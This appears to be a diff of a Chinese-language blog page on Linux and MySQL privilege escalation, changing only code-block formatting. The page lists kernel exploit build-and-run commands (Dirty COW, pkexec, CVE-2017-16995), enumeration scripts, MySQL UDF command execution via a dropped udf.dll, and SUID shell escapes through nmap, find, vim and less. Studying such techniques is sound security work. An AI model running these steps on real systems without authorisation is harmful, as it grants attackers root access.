@@ -186,15 +186,15 @@
         
 
         <h1 id="0x00信息收集">0x00信息收集</h1>
-<pre tabindex="0"><code>lsb_release -a
-查看系统发行版本
-
-uname -a
-查看内核版本
-
-whoami
-检测当前用户权限
-</code></pre><h1 id="0x01-内核提权">0x01 内核提权</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lsb_release -a
+</span></span><span style="display:flex;"><span>查看系统发行版本
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uname -a
+</span></span><span style="display:flex;"><span>查看内核版本
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>检测当前用户权限
+</span></span></code></pre></div><h1 id="0x01-内核提权">0x01 内核提权</h1>
 <h2 id="cve-2021-4034">CVE-2021-4034</h2>
 <p>pkexec 本地提权</p>
 <p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
@@ -203,24 +203,24 @@ whoami
 <h2 id="脏牛提权-cve-2016-5195">脏牛提权-CVE-2016-5195</h2>
 <p>条件: linux内核=&gt;2.6.22</p>
 <p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
-<pre tabindex="0"><code>gcc -pthread dirty.c -o dirty -lcrypt
-./dirty
-mv /tmp/passwd.bak /etc/passwd
-</code></pre><h2 id="cve-2017-16995">CVE-2017-16995</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -pthread dirty.c -o dirty -lcrypt
+</span></span><span style="display:flex;"><span>./dirty
+</span></span><span style="display:flex;"><span>mv /tmp/passwd.bak /etc/passwd
+</span></span></code></pre></div><h2 id="cve-2017-16995">CVE-2017-16995</h2>
 <p>影响版本: Linux Kernel Version 4.14-4.4 仅影响Ubuntu/Debian发行版本</p>
 <p><a href="https://github.com/Al1ex/CVE-2017-16995">https://github.com/Al1ex/CVE-2017-16995</a></p>
-<pre tabindex="0"><code>gcc exploit.c -o exploit
-./exploit
-</code></pre><h2 id="linenumsh本地linux枚举和提权辅助脚本">LINENUM.SH（本地LINUX枚举和提权辅助脚本）</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc exploit.c -o exploit
+</span></span><span style="display:flex;"><span>./exploit
+</span></span></code></pre></div><h2 id="linenumsh本地linux枚举和提权辅助脚本">LINENUM.SH（本地LINUX枚举和提权辅助脚本）</h2>
 <p>帮助提取linux系统信息</p>
 <p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
-<pre tabindex="0"><code>chmod +x /tmp/LinEnum.sh
-sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
-</code></pre><h2 id="linux-exploit-suggester2">linux-exploit-suggester2</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x /tmp/LinEnum.sh
+</span></span><span style="display:flex;"><span>sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
+</span></span></code></pre></div><h2 id="linux-exploit-suggester2">linux-exploit-suggester2</h2>
 <p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
 <p>帮助查看系统存在的提取漏洞</p>
-<pre tabindex="0"><code>perl linux-exploit-suggester-2.pl
-</code></pre><h2 id="kali-searchexploit">kali searchexploit</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>perl linux-exploit-suggester-2.pl
+</span></span></code></pre></div><h2 id="kali-searchexploit">kali searchexploit</h2>
 <p>​	searchsploit是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。</p>
 <p><strong>语法</strong></p>
 <blockquote>
@@ -252,20 +252,20 @@ sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
 <p>mysql有写入文件的权限</p>
 </blockquote>
 <h2 id="1查看mysql有写入文件的权限">1.查看mysql有写入文件的权限</h2>
-<pre tabindex="0"><code>show global variables like &#39;%secure%&#39;;
-</code></pre><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">show</span> <span style="color:#66d9ef">global</span> variables <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%secure%&#39;</span>;
+</span></span></code></pre></div><blockquote>
 <p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>
 </blockquote>
 <p>若secure_file_priv不为空白,可以在mysql/my.ini中修改</p>
-<pre tabindex="0"><code> secure_file_priv = &#39; &#39;
-</code></pre><p>然后重启apache服务</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span> secure_file_priv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span>
+</span></span></code></pre></div><p>然后重启apache服务</p>
 <p>查看plugin位置</p>
-<pre tabindex="0"><code>show variables like &#39;plugin%&#39;;
-</code></pre><p>查看数据库和服务器架构信息</p>
-<pre tabindex="0"><code>select @@version_compile_os, @@version_compile_machine;
-</code></pre><h2 id="2上传写入动态链接库">2.上传&amp;写入动态链接库</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">show</span> variables <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;plugin%&#39;</span>;
+</span></span></code></pre></div><p>查看数据库和服务器架构信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">@@</span>version_compile_os, <span style="color:#f92672">@@</span>version_compile_machine;
+</span></span></code></pre></div><h2 id="2上传写入动态链接库">2.上传&amp;写入动态链接库</h2>
 <blockquote>
 <p>1.Mysql版本大于5.1，plugin文件夹默认不存在，需要自行创建lib/plugin</p>
 <p>#若失败，更改my.ini，添加plugin_dir=C:/或者C:/System32</p>
@@ -276,25 +276,25 @@ sh /tmp/LinEnum.sh &amp;gt; /tmp/getinfo.txt
 <h3 id="上传">上传</h3>
 <p>利用sqlmap或者大马直接传输udf.dll,没什么好说的</p>
 <h3 id="写文件">写文件</h3>
-<pre tabindex="0"><code>create table temp(data longblob);
-select 0x0....(16进制字节) INTO DUMPFILE &#39;C:\\udf.dll&#39;;
-</code></pre><p>国光师傅已经归纳好了 <a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">create</span> <span style="color:#66d9ef">table</span> temp(<span style="color:#66d9ef">data</span> longblob);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#ae81ff">0</span>x0....(<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">进制字节</span>) <span style="color:#66d9ef">INTO</span> DUMPFILE <span style="color:#e6db74">&#39;C:\\udf.dll&#39;</span>;
+</span></span></code></pre></div><p>国光师傅已经归纳好了 <a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
 <h2 id="3创建自定义函数">3.创建自定义函数</h2>
-<pre tabindex="0"><code>create table temp(data longblob);
-select 0x0.... INTO DUMPFILE &#39;C:\\udf.dll&#39;;
-create function sys_eval returns string soname &#39;udf.dll&#39;;   #创建函数sys_eval
-select * from mysql.func where name = &#39;sys_eval&#39;;    #查看创建的sys_eval函数
-select sys_eval(&#39;whoami&#39;);       
-</code></pre><h1 id="0x03-suid提权">0x03 SUID提权</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">create</span> <span style="color:#66d9ef">table</span> temp(<span style="color:#66d9ef">data</span> longblob);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#ae81ff">0</span>x0.... <span style="color:#66d9ef">INTO</span> DUMPFILE <span style="color:#e6db74">&#39;C:\\udf.dll&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">create</span> <span style="color:#66d9ef">function</span> sys_eval <span style="color:#66d9ef">returns</span> string soname <span style="color:#e6db74">&#39;udf.dll&#39;</span>;   <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">创建函数</span>sys_eval
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> mysql.func <span style="color:#66d9ef">where</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sys_eval&#39;</span>;    <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">查看创建的</span>sys_eval函数
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> sys_eval(<span style="color:#e6db74">&#39;whoami&#39;</span>);       
+</span></span></code></pre></div><h1 id="0x03-suid提权">0x03 SUID提权</h1>
 <h2 id="1什么是suid">1.什么是SUID</h2>
 <p>SUID(SET UID)是linux的一种特殊权限,当权限为suid的程序作为进程运行时,它的属主不是进程发起者,而是程序文件的所有者.(只针对二进制可执行文件)</p>
 <p>比如在非root权限的条件下运行find程序,而find程序的所有者是root,我们就能短暂地执行root的命令,该进程的权限即为root.</p>
-<pre tabindex="0"><code>设置SUID
-chmod u+s filename   设置SUID位
-chmod u-s filename   去掉SUID设置
-
-ls -al               查看文件权限
-</code></pre><h2 id="2利用suid提权">2.利用SUID提权</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>设置SUID
+</span></span><span style="display:flex;"><span>chmod u+s filename   设置SUID位
+</span></span><span style="display:flex;"><span>chmod u-s filename   去掉SUID设置
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls -al               查看文件权限
+</span></span></code></pre></div><h2 id="2利用suid提权">2.利用SUID提权</h2>
 <p>常见的拥有SUID的程序有</p>
 <blockquote>
 <pre tabindex="0"><code>nmap
@@ -308,37 +308,37 @@ cp
 awk
 </code></pre></blockquote>
 <p>查看拥有SUID权限的文件,皆可.</p>
-<pre tabindex="0"><code>find / -user root -perm -4000 -print 2&gt;/dev/null
-find / -perm -u=s -type f 2&gt;/dev/null
-find / -user root -perm -4000 -exec ls -ldb {};
-</code></pre><p>查看文件权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -user root -perm -4000 -exec ls -ldb <span style="color:#f92672">{}</span>;
+</span></span></code></pre></div><p>查看文件权限</p>
 <p><img src="https://s2.loli.net/2022/05/03/WlE8fKQnMkUw2FO.png" alt=""></p>
 <p>可见,权限为suid且所有者为root</p>
 <h3 id="nmap202502">nmap(2.02~5.02)</h3>
 <p>早期nmap带有交互模式,运行执行shell命令</p>
-<pre tabindex="0"><code>nmap --interactive
-nmap&gt; !sh
-sh-3.2# whoami
-root
-</code></pre><h3 id="find">find</h3>
-<pre tabindex="0"><code>touch demo
-find demo -exec whoami \;
-find demo -exec &#39;/bin/sh&#39; \;
-</code></pre><h3 id="vim">vim</h3>
-<pre tabindex="0"><code>vim/vi
-:shell
-</code></pre><h3 id="lessmore">less/more</h3>
-<pre tabindex="0"><code>less /etc/passwd
-!/bin/sh
-</code></pre><h3 id="bash">bash</h3>
-<pre tabindex="0"><code>less /etc/passwd
-!/bin/sh
-</code></pre><h3 id="nano">nano</h3>
-<pre tabindex="0"><code>nano #进入nano编辑器
-Ctrl + R
-Ctrl + X
-即可输入命令
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --interactive
+</span></span><span style="display:flex;"><span>nmap&gt; !sh
+</span></span><span style="display:flex;"><span>sh-3.2# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="find">find</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch demo
+</span></span><span style="display:flex;"><span>find demo -exec whoami <span style="color:#ae81ff">\;</span>
+</span></span><span style="display:flex;"><span>find demo -exec <span style="color:#e6db74">&#39;/bin/sh&#39;</span> <span style="color:#ae81ff">\;</span>
+</span></span></code></pre></div><h3 id="vim">vim</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vim/vi
+</span></span><span style="display:flex;"><span>:shell
+</span></span></code></pre></div><h3 id="lessmore">less/more</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>less /etc/passwd
+</span></span><span style="display:flex;"><span>!/bin/sh
+</span></span></code></pre></div><h3 id="bash">bash</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>less /etc/passwd
+</span></span><span style="display:flex;"><span>!/bin/sh
+</span></span></code></pre></div><h3 id="nano">nano</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano <span style="color:#75715e">#进入nano编辑器</span>
+</span></span><span style="display:flex;"><span>Ctrl + R
+</span></span><span style="display:flex;"><span>Ctrl + X
+</span></span><span style="display:flex;"><span>即可输入命令
+</span></span></code></pre></div>
     </div>
 
     <div class="post-copyright">
